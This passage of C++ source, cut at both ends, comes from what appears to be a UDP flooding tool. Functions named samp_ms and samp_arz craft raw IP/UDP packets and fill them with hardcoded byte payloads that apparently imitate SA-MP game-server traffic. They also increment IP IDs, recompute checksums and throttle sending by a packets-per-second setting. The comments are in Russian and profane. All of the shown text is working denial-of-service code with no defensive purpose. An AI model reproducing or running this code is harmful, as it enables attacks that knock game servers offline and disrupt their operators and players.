	memcpy((void*)udph + sizeof(struct udphdr), "\x7e\x00\x48\xbc\x80\x11\x00\x14\x98\xf8\x27\xfd\x00\x91\x79\x80\x23\xc0\x14\x92\xe2\x0b\x14\xa8\xd3\xd0\xfe\x00\x91\x7a\x00\x22\x00\x14\x5e\xf8\x0d\xff\x00\x91\x7a\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x00\x01\x91\x7b\x00\x22\x00\x14\x58\xf8\x07\x01\x01\x91\x7b\x80\x22\x00\x14\x98\xf8\x0d\x02\x01\x91\x7c\x00\x23\xc0\x14\x92\xe2\x06\x52\x67\xd3\xd0\x03\x01\x91\x7c\x80\x22\x00\x14\x5e\xf8\x03\x04\x01\x91\x7d\x00\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x05\x01\x91\x7d\x80\x22\x00\x14\x58\xf8\x06\x06\x01\x91\x7e\x00\x22\x00\x14\x98\xf8\x30\x07\x01\x91\x7e\x80\x23\xc0\x14\x92\xe2\x0d\xd9\x06\xe3\xd0\x08\x01\x91\x7f\x00\x22\x00\x14\x5e\xf8\x0e\x09\x01\x91\x7f\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x0a\x01\x91\x00\x00\xa2\x00\x14\x58\xf8\x14\x0b\x01\x91\x00\x80\xa2\x00\x14\x98\xf8\x2f\x0c\x01\x91\x01\x00\xa3\xc0\x14\x92\xe2\x08\x6c\xe5\x13\xd0\x0d\x01\x91\x01\x80\xa2\x00\x14\x5e\xf8\x13\x0e\x01\x91\x02\x00\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x0f\x01\x91\x02\x80\xa2\x00\x14\x58\xf8\x0b\x10\x01\x91\x03\x00\xa2\x00\x14\x98\xf8\x07\x11\x01\x91\x03\x80\xa3\xc0\x14\x92\xe2\x00\xf7\x1d\x53\xc0\x12\x01\x91\x04\x00\xa2\x00\x14\x5e\xf8\x15\x13\x01\x91\x04\x80\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x14\x01\x91\x05\x00\xa2\x00\x14\x58\xf8\x18\x15\x01\x91\x05\x80\xa2\x00\x14\x98\xf8\x21\x16\x01\x91\x06\x00\xa3\xc0\x14\x92\xe2\x01\x57\xef\x63\xb0\x17\x01\x91\x06\x80\xa2\x00\x14\x5e\xf8\x0c\x18\x01\x91\x07\x00\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x19\x01\x91\x07\x80\xa2\x00\x14\x58\xf8\x07\x1a\x01\x91\x08\x00\xa2\x00\x14\x98\xf8\x18\x1b\x01\x91\x08\x80\xa3\xc0\x14\x92\xe2\x0c\x0c\x9e\xf3\xc0\x1c\x01\x91\x09\x00\xa2\x00\x14\x5e\xf8\x15", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms26(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 540; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0e\x80\xc8\x84\xc0\x57\x40\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x1e\x01\x91\x0a\x00\xa2\x00\x14\x58\xf8\x14\x1f\x01\x91\x0a\x80\xa2\x00\x14\x98\xf8\x1b\x20\x01\x91\x0b\x00\xa3\xc0\x14\x92\xe2\x02\x37\xb4\xa3\xd0\x21\x01\x91\x0b\x80\xa2\x00\x14\x5e\xf8\x0c\x22\x01\x91\x0c\x00\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x23\x01\x91\x0c\x80\xa2\x00\x14\x58\xf8\x0a\x24\x01\x91\x0d\x00\xa2\x00\x14\x98\xf8\x06\x25\x01\x91\x0d\x80\xa3\xc0\x14\x92\xe2\x06\x58\xc6\x23\xd0\x26\x01\x91\x0e\x00\xa2\x00\x14\x5e\xf8\x0c\x27\x01\x91\x0e\x80\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x28\x01\x91\x0f\x00\xa2\x00\x14\x58\xf8\x09\x29\x01\x91\x0f\x80\xa2\x00\x14\x98\xf8\x1c\x2a\x01\x91\x10\x00\xa3\xc0\x14\x92\xe2\x01\x35\xa1\xa3\xd0\x2b\x01\x91\x10\x80\xa2\x00\x14\x5e\xf8\x0a\x2c\x01\x91\x11\x00\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x2d\x01\x91\x11\x80\xa2\x00\x14\x58\xf8\x0f\x2e\x01\x91\x12\x00\xa2\x00\x14\x98\xf8\x31\x2f\x01\x91\x12\x80\xa3\xc0\x14\x92\xe2\x07\x6f\xc0\x13\xd0\x30\x01\x91\x13\x00\xa2\x00\x14\x5e\xf8\x15\x31\x01\x91\x13\x80\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x32\x01\x91\x14\x00\xa2\x00\x14\x58\xf8\x0a\x33\x01\x91\x14\x80\xa2\x00\x14\x98\xf8\x2c\x34\x01\x91\x15\x00\xa3\xc0\x14\x92\xe2\x05\xdd\x7b\xe3\xd0\x35\x01\x91\x15\x80\xa2\x00\x14\x5e\xf8\x06\x36\x01\x91\x16\x00\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x37\x01\x91\x16\x80\xa2\x00\x14\x58\xf8\x0a\x38\x01\x91\x17\x00\xa2\x00\x14\x98\xf8\x17\x39\x01\x91\x17\x80\xa3\xc0\x14\x92\xe2\x0b\xac\xbd\x43\xc0\x3a\x01\x91\x18\x00\xa2\x00\x14\x5e\xf8\x17\x3b\x01\x91\x18\x80\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms27(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 515; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x2e\x80\xc8\x94\xc0\x51\x00\x14\x5e\xf8\x09\x5e\x01\x91\x2a\x00\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x5f\x01\x91\x2a\x80\xa2\x00\x14\x58\xf8\x03\x60\x01\x91\x2b\x00\xa2\x00\x14\x98\xf8\x22\x61\x01\x91\x2b\x80\xa3\xc0\x14\x92\xe2\x0e\x34\x16\x13\xc0\x62\x01\x91\x2c\x00\xa2\x00\x14\x5e\xf8\x08\x63\x01\x91\x2c\x80\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x64\x01\x91\x2d\x00\xa2\x00\x14\x58\xf8\x12\x65\x01\x91\x2d\x80\xa2\x00\x14\x98\xf8\x2e\x66\x01\x91\x2e\x00\xa3\xc0\x14\x92\xe2\x06\x4d\xe3\x03\xb0\x67\x01\x91\x2e\x80\xa2\x00\x14\x5e\xf8\x05\x68\x01\x91\x2f\x00\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x69\x01\x91\x2f\x80\xa2\x00\x14\x58\xf8\x11\x6a\x01\x91\x30\x00\xa2\x00\x14\x98\xf8\x20\x6b\x01\x91\x30\x80\xa3\xc0\x14\x92\xe2\x04\x70\x09\x33\xd0\x6c\x01\x91\x31\x00\xa2\x00\x14\x5e\xf8\x12\x6d\x01\x91\x31\x80\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x6e\x01\x91\x32\x00\xa2\x00\x14\x58\xf8\x00\x6f\x01\x91\x32\x80\xa2\x00\x14\x98\xf8\x23\x70\x01\x91\x33\x00\xa3\xc0\x14\x92\xe2\x00\xbe\x10\x03\xd0\x71\x01\x91\x33\x80\xa2\x00\x14\x5e\xf8\x00\x72\x01\x91\x34\x00\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x73\x01\x91\x34\x80\xa2\x00\x14\x58\xf8\x0b\x74\x01\x91\x35\x00\xa2\x00\x14\x98\xf8\x21\x75\x01\x91\x35\x80\xa3\xc0\x14\x92\xe2\x08\x7c\xc6\x13\xd0\x76\x01\x91\x36\x00\xa2\x00\x14\x5e\xf8\x13\x77\x01\x91\x36\x80\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x78\x01\x91\x37\x00\xa2\x00\x14\x58\xf8\x09\x79\x01\x91\x37\x80\xa2\x00\x14\x98\xf8\x24\x7a\x01\x91\x38\x00\xa3\xc0\x14\x92\xe2\x04\x13\xfa\xa3\xd0\x7b\x01\x91\x38\x80\xa2\x00\x14\x5e\xf8\x07", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms28(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 538; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x7d\x00\xc8\xbc\x00\x51\x00\x14\x58\xf8\x16\xfb\x01\x91\x78\x80\xa2\x00\x14\x98\xf8\x21\xfc\x01\x91\x79\x00\xa3\xc0\x14\x92\xe2\x0e\x72\x8b\x63\xb0\xfd\x01\x91\x79\x80\xa2\x00\x14\x5e\xf8\x03\xfe\x01\x91\x7a\x00\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xff\x01\x91\x7a\x80\xa2\x00\x14\x58\xf8\x09\x00\x02\x70\x80\x00\x22\x80\xd0\x00\x00\x00\x00\x01\x02\x91\x7b\x00\xa2\x00\x14\x98\xf8\x1d\x02\x02\x91\x7b\x80\xa3\xc0\x14\x92\xe2\x00\x71\x39\xd3\xb0\x03\x02\x91\x7c\x00\xa2\x00\x14\x5e\xf8\x00\x04\x02\x91\x7c\x80\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x05\x02\x91\x7d\x00\xa2\x00\x14\x58\xf8\x09\x06\x02\x91\x7d\x80\xa2\x00\x14\x98\xf8\x0f\x07\x02\x91\x7e\x00\xa3\xc0\x14\x92\xe2\x06\xcb\x27\x43\xd0\x08\x02\x91\x7e\x80\xa2\x00\x14\x5e\xf8\x06\x09\x02\x91\x7f\x00\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x0a\x02\x91\x7f\x80\xa2\x00\x14\x58\xf8\x14\x0b\x02\x91\x00\x01\x22\x00\x14\x98\xf8\x2f\x0c\x02\x91\x00\x81\x23\xc0\x14\x92\xe2\x06\x42\x46\xf3\xd0\x0d\x02\x91\x01\x01\x22\x00\x14\x5e\xf8\x10\x0e\x02\x91\x01\x81\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x0f\x02\x91\x02\x01\x22\x00\x14\x58\xf8\x01\x10\x02\x91\x02\x81\x22\x00\x14\x98\xf8\x08\x11\x02\x91\x03\x01\x23\xc0\x14\x92\xe2\x00\xab\xf1\x03\xd0\x12\x02\x91\x03\x81\x22\x00\x14\x5e\xf8\x06\x13\x02\x91\x04\x01\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x14\x02\x91\x04\x81\x22\x00\x14\x58\xf8\x18\x15\x02\x91\x05\x01\x22\x00\x14\x98\xf8\x2d\x16\x02\x91\x05\x81\x23\xc0\x14\x92\xe2\x07\xcb\x9a\x53\xd0\x17\x02\x91\x06\x01\x22\x00\x14\x5e\xf8\x05\x18\x02\x91\x06\x81\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x19\x02\x91\x07\x01\x22\x00\x14\x58\xf8\x03\x1a\x02\x91\x07\x81\x22\x00\x14\x98\xf8\x1b", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms29(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0d\x81\x48\x84\x00\x91\xe0\x14\x92\xe2\x04\xa0\xe2\x53\xd0\x1c\x02\x91\x08\x81\x22\x00\x14\x5e\xf8\x10\x1d\x02\x91\x09\x01\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x1e\x02\x91\x09\x81\x22\x00\x14\x58\xf8\x05\x1f\x02\x91\x0a\x01\x22\x00\x14\x98\xf8\x2d\x20\x02\x91\x0a\x81\x23\xc0\x14\x92\xe2\x01\xbf\x2f\xa3\xc0\x21\x02\x91\x0b\x01\x22\x00\x14\x5e\xf8\x01\x22\x02\x91\x0b\x81\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x23\x02\x91\x0c\x01\x22\x00\x14\x58\xf8\x14\x24\x02\x91\x0c\x81\x22\x00\x14\x98\xf8\x30\x25\x02\x91\x0d\x01\x23\xc0\x14\x92\xe2\x0f\xc0\xa6\x63\xc0\x26\x02\x91\x0d\x81\x22\x00\x14\x5e\xf8\x0d\x27\x02\x91\x0e\x01\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x28\x02\x91\x0e\x81\x22\x00\x14\x58\xf8\x0d\x29\x02\x91\x0f\x01\x22\x00\x14\x98\xf8\x12\x2a\x02\x91\x0f\x81\x23\xc0\x14\x92\xe2\x0a\x09\x95\xb3\xd0\x2b\x02\x91\x10\x01\x22\x00\x14\x5e\xf8\x0b\x2c\x02\x91\x10\x81\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x2d\x02\x91\x11\x01\x22\x00\x14\x58\xf8\x0c\x2e\x02\x91\x11\x81\x22\x00\x14\x98\xf8\x1f\x2f\x02\x91\x12\x01\x23\xc0\x14\x92\xe2\x09\x93\x0c\xa3\xd0\x30\x02\x91\x12\x81\x22\x00\x14\x5e\xf8\x03\x31\x02\x91\x13\x01\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x32\x02\x91\x13\x81\x22\x00\x14\x58\xf8\x13\x33\x02\x91\x14\x01\x22\x00\x14\x98\xf8\x0b\x34\x02\x91\x14\x81\x23\xc0\x14\x92\xe2\x04\xab\x0f\xb3\xc0\x35\x02\x91\x15\x01\x22\x00\x14\x5e\xf8\x16\x36\x02\x91\x15\x81\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x37\x02\x91\x16\x01\x22\x00\x14\x58\xf8\x12\x38\x02\x91\x16\x81\x22\x00\x14\x98\xf8\x2b\x39\x02\x91\x17\x01\x23\xc0\x14\x92\xe2\x05\xb2\x7a\xf3\xb0\x3a\x02\x91\x17\x81\x22\x00\x14\x5e\xf8\x09", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms30(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 168; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x61\x81\xc8\xae\x00\xd1\x00\x14\x98\xf8\x24\xc4\x03\x91\x5c\x81\xa3\xc0\x14\x92\xe2\x05\x25\xf8\x43\xd0\xc5\x03\x91\x5d\x01\xa2\x00\x14\x5e\xf8\x17\xc6\x03\x91\x5d\x81\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xc7\x03\x91\x5e\x01\xa2\x00\x14\x58\xf8\x0a\xc8\x03\x91\x5e\x81\xa2\x00\x14\x98\xf8\x26\xc9\x03\x91\x5f\x01\xa3\xc0\x14\x92\xe2\x0b\x24\x99\xd3\xd0\xca\x03\x91\x5f\x81\xa2\x00\x14\x5e\xf8\x13\xcb\x03\x91\x60\x01\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xcc\x03\x91\x60\x81\xa2\x00\x14\x58\xf8\x18", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms31(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 84; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x66\x81\xc8\xb0\x80\xd1\x00\x14\x98\xf8\x08\xce\x03\x91\x61\x81\xa3\xc0\x14\x92\xe2\x06\x9d\x78\x63\xd0\xcf\x03\x91\x62\x01\xa2\x00\x14\x5e\xf8\x00\xd0\x03\x91\x62\x81\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xd1\x03\x91\x63\x01\xa2\x00\x14\x58\xf8\x0f", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms32(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 96; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x1f\x98\x38\x42\x00\x11\x40\xd0\x00\x00\x00\x00\x40\x30\x91\x14\x18\x22\x00\x14\x98\xf8\x0e\x41\x30\x91\x14\x98\x23\xc0\x14\x92\xe2\x01\x96\xb9\xb3\xd0\x42\x30\x91\x15\x18\x22\x00\x14\x5e\xf8\x0a\x43\x30\x91\x15\x98\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x44\x30\x91\x16\x18\x22\x00\x14\x58\xf8\x07", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz1(struct iphdr* iph, struct udphdr* udph)
{
	char buf[] = { (char)(rand() & 0xFF), (char)(rand() & 0xFF) };
	int playloadlen = 2; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), buf, playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz2(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 3; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x1a\xa6\xc7", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz3(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 2; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x19\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz4(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 3; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe3\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz5(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 22; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x00\x00\x42\x90\x0c\x10\x37\x41\x39\x33\x44\x41\x32\x37\x33\x39\x31\x37\x38\x45\x41\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz6(struct iphdr* iph, struct udphdr* udph)
{
